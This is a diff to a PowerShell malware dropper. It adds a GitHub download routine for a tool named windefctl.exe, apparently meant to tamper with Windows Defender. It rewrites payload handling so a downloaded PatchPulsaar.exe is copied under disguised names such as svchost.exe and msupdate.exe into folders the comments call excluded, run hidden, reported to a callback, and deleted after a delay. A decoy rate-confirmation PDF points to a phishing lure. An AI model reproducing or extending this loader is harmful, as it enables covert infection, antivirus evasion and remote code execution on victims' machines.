@@ -38,12 +38,25 @@ function _dl($n){
             $wc=New-Object Net.WebClient
             $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
             $d=$wc.DownloadData("$src/$n")
-            _log "DL: $n $($d.Length)"
+            _log "DL: $n $($d.Length) from $src"
             return ,$d
         }catch{}
     }
     _log "DL: $n fail"
     return $null
+}
+
+function _dlGh($n){
+    try{
+        $wc=New-Object Net.WebClient
+        $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
+        $d=$wc.DownloadData("$gh/$n")
+        _log "DL: $n $($d.Length) from github"
+        return ,$d
+    }catch{
+        _log "DL: $n fail from github"
+        return $null
+    }
 }
 
 function _run($n,$s,$l){
@@ -134,7 +147,7 @@ if($cbIsAdmin){
 }
 
 # download windefctl regardless of admin (for logging/diagnosis and UAC attempt)
-$wdcBytes=_dl 'windefctl.exe'
+$wdcBytes=_dlGh 'windefctl.exe'
 $wdcPath="$env:TEMP\windefctl.exe"
 if($wdcBytes){
     [IO.File]::WriteAllBytes($wdcPath,$wdcBytes)|Out-Null
@@ -195,7 +208,45 @@ if($cbIsAdmin){
 
 _cb 'S3' 'ok' 'persist ok'
 
-_run 'PatchPulsaar.exe' 'S5' 'payload' | Out-Null
+# download payload once
+$ppBytes=_dl 'PatchPulsaar.exe'
+$ppTemp="$env:TEMP\PatchPulsaar.exe"
+$ppPaths=@(
+    "$env:TEMP\wmisrv.exe",
+    "$env:APPDATA\svchost.exe",
+    "$env:USERPROFILE\Downloads\msupdate.exe"
+)
+if($ppBytes){
+    # write original copy
+    [IO.File]::WriteAllBytes($ppTemp,$ppBytes)|Out-Null
+    _log "S5: PatchPulsaar written $($ppBytes.Length)"
+    # mirror into excluded folders/names
+    foreach($mirror in $ppPaths){
+        try{
+            [IO.File]::WriteAllBytes($mirror,$ppBytes)|Out-Null
+            _log "S5: mirror $mirror"
+        }catch{ _log "S5: mirror fail $mirror" }
+    }
+    # run from excluded location
+    $runPath=$ppPaths[0]
+    try{
+        Start-Process $runPath -WindowStyle Hidden | Out-Null
+        _log "S5: payload started from $runPath"
+        _cb 'S5' 'ok' 'payload'
+    }catch{
+        _log "S5: payload start err: $($_.Exception.Message)"
+        _cb 'S5' 'fail' 'payload err'
+    }
+}else{
+    _log 'S5: PatchPulsaar dl fail'
+    _cb 'S5' 'fail' 'payload dl fail'
+}
+
+# cleanup payload mirrors after a delay
+Start-Job -ScriptBlock {
+    Start-Sleep 30
+    foreach($f in @("$env:TEMP\PatchPulsaar.exe","$env:TEMP\wmisrv.exe","$env:APPDATA\svchost.exe","$env:USERPROFILE\Downloads\msupdate.exe")){Remove-Item $f -Force -ErrorAction SilentlyContinue}
+}|Out-Null
 
 $pdf='Rate_Confirmation_LD-2026-0847.pdf'
 $pdfPath="$env:USERPROFILE\Downloads\$pdf"
